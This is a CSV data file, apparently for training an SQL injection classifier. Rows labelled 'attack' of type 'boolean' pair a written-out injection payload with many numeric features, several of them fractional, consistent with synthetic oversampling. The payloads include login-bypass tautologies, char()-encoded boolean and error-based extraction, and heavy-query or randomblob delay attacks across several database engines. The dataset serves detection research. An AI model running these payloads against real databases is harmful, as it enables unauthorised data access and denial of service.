id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000088,attack,boolean,-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000031,2.691415469395857,368.5403354966119,30.40389820823922,3.3117544892870208,86.8467784988706,58.0,172.4818623730236,51.21169462471765,0.23542990060754765,0.1577333082804325,0.46775289192094743,0.13908389919107242,0.5961017917607822,0.0,2.192203583521564,0.0,0.0,2.4038982082392177,0.0,35.61559283295687,0.0,0.0,0.40389820823921796,14.596101791760782,0.596101791760782,0.0,0.596101791760782,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.403898208239218,0.0,0.596101791760782,0.0,0.40389820823921807,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.403898208239218,3.469446951953614e-18,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.807796416478435
SMOTE_000089,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000051,0.8918341307479579,116.7201912122629,33.62913726357888,3.761552698344053,34.85099021126305,16.629137263578883,47.425495105631526,17.81456863178944,0.29717500346131737,0.1413478849847256,0.4084981351465591,0.1529789764073979,3.4072843158947212,0.0,2.0,1.0,0.0,1.2036421579473604,0.0,9.0,0.0,0.0,1.0,4.407284315894721,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.20364215794736074,0.0,0.20364215794736068,0.0,0.7963578420526394,0.20364215794736062,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4072843158947212
SMOTE_000090,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000034,0.815625935381689,208.4299499142213,33.36715001225409,3.7636392302076556,60.79709992647542,35.0,81.2656999754918,31.367150012254097,0.29154124244703955,0.16796654012178824,0.38992209836127273,0.15057011906989948,0.0,0.36715001225409627,2.0,0.0,0.0,2.0,0.0,17.0,0.0,1.0,3.0,10.0,0.0,0.36715001225409627,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000091,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,2.7229905759405706,274.43223810805915,38.600948179648796,3.8274946332773006,87.81232633543439,33.20071113473659,111.81469678455638,41.60450385333179,0.31644218386817674,0.12658739568672317,0.4046939297395462,0.15227649070555394,2.800474089824399,0.0,0.0,0.0,0.0,1.5997629550878005,0.0,23.603318628770793,0.0,1.4002370449121995,3.4002370449122,10.400237044912199,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.5997629550878004,0.4002370449121996,0.40023704491219964,0.5997629550878004,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.8004740898244,0.0,0.0,0.0,0.0,0.0,0.0,0.40023704491219964,0.40023704491219964,9.600948179648798
SMOTE_000092,attack,boolean,"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000063,0.6750246222473646,257.0987214018137,37.267613624727,3.7944460635559554,77.42258515454373,36.6338068123635,101.23948856072548,41.80284087418099,0.30017822457219073,0.143775809837792,0.393705043265597,0.1623409223244202,0.8169034061817491,0.18309659381825105,2.0,0.0,0.0,2.0,0.0,21.901420437090493,0.0,1.8169034061817486,3.8169034061817486,13.267613624726994,0.8169034061817488,0.18309659381825116,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,6.633806812363499,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.633806812363499
SMOTE_000093,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000035,1.8624166136997942,379.4758188909467,31.0,3.362933927352193,95.05241811090534,58.0,174.47581889094673,51.94758188909467,0.25072568321208655,0.15294804230301517,0.45940778151520495,0.13691849296969333,0.0,0.0,2.0524181109053283,0.0,0.0,3.0,0.0,35.89516377818934,0.0,0.0,1.0,15.052418110905329,0.0,0.0,0.5262090554526642,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,0.5262090554526642,0.0,0.47379094454733583,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000094,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000060,1.0145092883240614,228.3356335503002,35.261169593517415,3.759119431906043,69.78350878055224,28.970214417286893,91.04467837406966,38.53723197839138,0.30544771416185873,0.1278196635433027,0.39848716299680165,0.16824545929803694,0.0,0.0,2.0,0.0,0.0,1.2462768021608617,0.0,20.768615989195695,0.0,1.7537231978391383,3.7537231978391388,12.261169593517415,0.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.24627680216086156,0.0,0.7537231978391384,0.24627680216086156,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,6.5074463956782775,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.753723197839139
SMOTE_000095,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000050,0.685264155298753,85.18202481935305,29.0,3.9545864953046093,25.98124822602843,16.0,29.2195283672962,13.981248226028432,0.3060113844236184,0.1942955885077631,0.3394033340258224,0.16028969304279608,0.0,4.0,0.876171985873223,0.0,0.0,1.1238280141267767,0.0,4.742968084760662,0.24765602825355365,1.123828014126777,1.0,2.7429680847606615,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.12382801412677685,0.0,0.0,0.0,0.0,1.123828014126777,0.8761719858732231,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000096,attack,boolean,-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000031,0.4120829893147882,355.2158827160447,30.075992669752793,3.328495747518422,83.0638973765391,58.0,164.0759926697528,50.07599266975279,0.2337526132888928,0.1633033959571645,0.46195981554177096,0.14098417521217174,0.9240073302472074,0.0,3.0,0.0,0.0,2.0759926697527926,0.0,34.0,0.0,0.0,0.07599266975279262,15.075992669752793,0.9240073302472074,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0759926697527926,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.07599266975279262,3.469446951953614e-18,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.151985339505583
SMOTE_000097,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000025,1.3127054344467868,119.13531949609495,27.217654216847297,3.2605719256208574,28.941189485176906,12.999999999999998,57.71177316536499,19.48235684555307,0.23624570032046444,0.11182091701556982,0.48816229535489153,0.16377108730907425,4.0,0.0,0.0,0.0,1.0,2.0,0.0,9.494118948517691,1.4941189485176902,0.7470594742588451,0.7470594742588452,3.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.7470594742588451,0.0,0.0,0.7470594742588451,1.2529405257411548,0.7470594742588451,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4941189485176904
SMOTE_000098,attack,boolean,"admin""  )   or   (  ""1""  =  ""1""--",nearest_attack_euclidean,R000002,2.555163017916912,59.046822879220414,21.063545187585202,3.302846156208323,14.505016761809273,8.180602039137051,24.5953177813778,11.7658862968963,0.23364222430341341,0.11062787270523118,0.41929840793029693,0.2364314950610585,0.0,4.558528425775925,1.5585284257759249,0.0,0.0,0.9999999999999999,0.0,3.7658862968963005,0.0,0.4414715742240751,0.4414715742240751,2.5585284257759247,0.0,1.0,0.558528425775925,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.4414715742240751,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4414715742240753
SMOTE_000099,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000053,2.6815013421523206,161.87299464486054,32.556103632935844,4.247149121479315,85.55610363293584,12.995067303577413,42.32675640476988,20.995067303577414,0.5329455509331662,0.07847854899439294,0.26028903938054715,0.1282868606918937,4.0,0.0,0.0,0.0,1.0,1.443896367064157,0.0,4.887792734128315,0.0,2.2194818353207846,3.4438963670641574,4.219481835320784,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.4438963670641569,1.443896367064157,0.0,0.4438963670641569,1.4438963670641571,0.5561036329358431,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.887792734128314
SMOTE_000100,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000017,0.7959043546082981,260.3225140608191,37.3801795757728,3.8064461884355563,78.28107745463677,37.0,102.28107745463677,42.76035915154559,0.3006219648999216,0.14222708622712577,0.39287737218238156,0.16427357669057105,0.3801795757727964,0.0,2.0,0.0,0.0,2.0,0.0,22.380179575772797,0.0,2.0,4.0,14.0,0.38017957577279626,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000101,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000074,1.5201496527005467,140.57465054490558,39.029860217962224,4.013986021672312,44.54479032694334,23.0,53.48506989101889,19.54479032694334,0.31678681928079666,0.16366590845582102,0.3806581795649998,0.1388890926983825,4.029860217962225,0.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.514930108981113,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.5149301089811128,0.0,1.0,0.0,0.48506989101888726,0.5149301089811128,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5149301089811127
SMOTE_000102,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,0.9926936247256962,131.11792841929216,29.26474105241152,3.9271312798475795,66.58844631446911,8.0,41.0,15.529482104823039,0.5076808819845259,0.06105678564169427,0.3129160264136831,0.11834630596009674,0.0,0.26474105241151935,2.0,0.0,1.0,0.9999999999999999,0.0,6.0,0.26474105241151935,0.0,2.0,4.0,0.0,0.26474105241151935,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.7352589475884806,0.26474105241151935,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000103,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000001,2.3704617811205013,55.88196573373668,16.611187751298385,3.2145431232038884,24.04840247984151,4.31164418562938,19.072603719762263,8.449315348503504,0.5083553764845073,0.03449315348503504,0.2908168982906248,0.16633457173983282,3.7125570542913744,0.0,0.5748858914172507,0.2874429457086254,0.0,0.9999999999999999,0.0,2.586986511377628,0.0,0.0,0.2874429457086256,1.862328837125876,1.0,0.0,0.2874429457086254,0.0,3.469446951953614e-18,1.0,0.2874429457086254,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000104,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000050,0.4620609614986911,77.22169957319014,28.7081373399463,3.9604655847086665,23.1244120198389,16.486437766756165,25.805424893297534,11.805424893297534,0.2986050087529068,0.2143580499333221,0.3342598814604879,0.15277705985328316,0.0,3.7081373399463002,1.0972875533512332,0.0,0.0,1.0972875533512332,0.0,3.902712446648767,0.0,1.0,1.0,2.194575106702466,0.0,1.0,0.09728755335123318,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.09728755335123318,0.0,1.0,0.9027124466487668,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000105,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000065,2.5459161678840956,374.00622644782266,30.628051777856342,3.2817405105863964,88.79272488998876,55.02441422285073,177.18908733498316,53.0,0.23712833385797893,0.14699741678074388,0.4737130877691291,0.14216116159214806,0.0,1.4877928885746377,1.0,0.0,0.0,2.628051777856341,0.0,36.51220711142536,0.7438964442873188,0.0,0.6280517778563406,13.62805177785634,0.0,0.37194822214365947,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.6280517778563406,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6280517778563406,3.469446951953614e-18,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,18.25610355571268
SMOTE_000106,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000011,1.8743149137252826,131.36112278096925,35.44658568498817,3.87596086731408,43.510682863002366,18.91453709598108,51.44658568498817,17.489317136997634,0.3322287510442115,0.14283479972655627,0.3916596054699147,0.1332768437593175,3.0,0.0,2.0,1.0,0.0,1.4893171369976348,0.0,9.0,0.0,0.0,1.0,4.489317136997634,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.4893171369976348,0.0,0.4893171369976348,0.5106828630023652,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4893171369976348
SMOTE_000107,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000019,0.9379073022519865,234.03458215011545,36.002305476674366,3.75499898636487,69.6101440973672,28.002305476674362,94.01383286004618,42.408299716027706,0.29752035270128535,0.12074900016938026,0.40174459140331337,0.17998605572602105,3.4013832860046174,0.0,0.0,0.0,0.0,1.8004610953348725,0.0,20.802766572009233,1.6009221906697448,1.8004610953348723,3.8004610953348728,11.002305476674362,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.8004610953348725,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,6.6009221906697455,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.401383286004618
SMOTE_000108,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000064,0.8581635421104953,146.23374404528113,30.22078199433986,3.9797363593077737,76.1039099716993,7.116872022640566,43.675308033960846,19.337654016980423,0.5210351289775778,0.0484279491789843,0.2984279491789843,0.13210897266445368,0.0,3.779218005660142,0.0,0.0,1.0,1.7792180056601417,0.0,5.779218005660142,1.5584360113202829,0.0,2.220781994339858,2.7792180056601414,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.7792180056601419,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7792180056601414
SMOTE_000109,attack,boolean,-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000031,3.653049055958896,371.35608172501566,30.46908328986529,3.301452796038958,91.85074908717107,52.840083811481826,173.85074908717107,52.81449973919173,0.24654996225387077,0.14337232454241375,0.46790619282699714,0.14217152037671832,2.4072498695958657,0.0,1.592750130404134,0.0,0.0,2.4690832898652886,0.0,35.876333159461154,0.0,0.0,0.4690832898652886,14.061833420269423,1.0,0.0,0.5309167101347115,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.4690832898652886,0.0,0.5309167101347114,0.0,0.9381665797305772,0.5309167101347114,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4690832898652886,3.469446951953614e-18,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.938166579730574
SMOTE_000110,attack,boolean,"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",nearest_attack_euclidean,R000023,1.746341446366881,225.65878135680902,30.710774891270955,3.7401112945405117,51.313800869832356,61.889409075035104,86.33553461868033,26.120036793261214,0.2460650754057207,0.2599289999303305,0.378220063110404,0.11578586155354481,0.0,0.8553874456354779,0.28922510872904417,0.0,1.8553874456354778,0.9999999999999999,0.0,16.264649347625735,0.0,0.0,5.421549782541911,3.144612554364522,0.0,0.855387445635478,0.14461255436452214,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.8553874456354779,0.0,3.5661623369064337,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8553874456354779,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.421549782541911
SMOTE_000111,attack,boolean,"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000072,0.072818176134819,148.8320374335185,32.976005347645504,4.120329683191115,75.83203743351851,16.0,41.0,16.0,0.5094876043409988,0.1075095661718359,0.2754932633153295,0.1075095661718359,0.976005347645502,0.023994652354498047,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.976005347645502,0.023994652354498047,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000112,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,1.104932722948585,117.42965972778522,29.0,4.12202900712812,67.47094246826461,7.305811506347078,30.305811506347077,12.34709424682646,0.5729464213867325,0.06287368017577567,0.2591067658691319,0.10507313256835998,0.0,1.3470942468264608,0.0,0.0,1.0,0.8264528765867696,0.0,3.82645287658677,0.0,0.0,2.1735471234132304,1.82645287658677,0.0,1.0,0.0,0.0,3.469446951953614e-18,0.8264528765867696,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.17354712341323053,0.8264528765867696,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
